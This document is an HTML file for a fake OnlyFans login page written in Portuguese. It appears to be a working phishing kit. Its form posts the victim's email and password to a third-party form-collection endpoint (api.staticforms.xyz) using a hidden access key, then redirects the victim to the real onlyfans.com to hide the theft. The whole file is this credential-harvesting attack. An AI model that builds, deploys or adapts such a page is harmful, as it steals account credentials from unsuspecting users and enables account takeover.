<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
  <title>OnlyFans</title>
  <link rel="stylesheet" href="OnlyFans.css">
</head>
<body>
  <div class="container">
    <img src="image.jpg" alt="Imagem" class="image">
    <form action="https://api.staticforms.xyz/submit" method="post">
      <!-- Versão para PC -->
      <img src="logo.png" alt="OnlyFans Logo" class="logo pc-logo">
      <!-- Versão para dispositivos móveis -->
      <img src="logo2.jpg" alt="OnlyFans Logo" class="logo mobile-logo">    
      <p class="support-text hide-on-pc">Inscreva-se para apoiar<br>seus criadores favoritos</p>
      <h1 class="login-text">Faça login</h1>
      <input type="email" id="email" name="email" placeholder="E-mail" required oninput="checkInput()">
      <input type="password" name="name" id="name" data-testid="royal_pass" placeholder="Senha" aria-label="Senha">
      <button data-testid="royal_login_button" type="submit" method="post" action="https://api.staticforms.xyz/submit" id="u_0_5_+H">Login</button>
      <input type="hidden" name="accessKey" value="57236f09-321b-41bc-80f2-20efc7ccc0d9">
      <input type="hidden" name="redirectTo" value="https://onlyfans.com">
      <div class="signup-link">
        Não tem uma conta? <a href="#">Cadastre-se agora</a>
        
      </div>
    </form>
    <input type="hidden" name="accessKey" value="57236f09-321b-41bc-80f2-20efc7ccc0d9">
  </div>
</body>
</html>
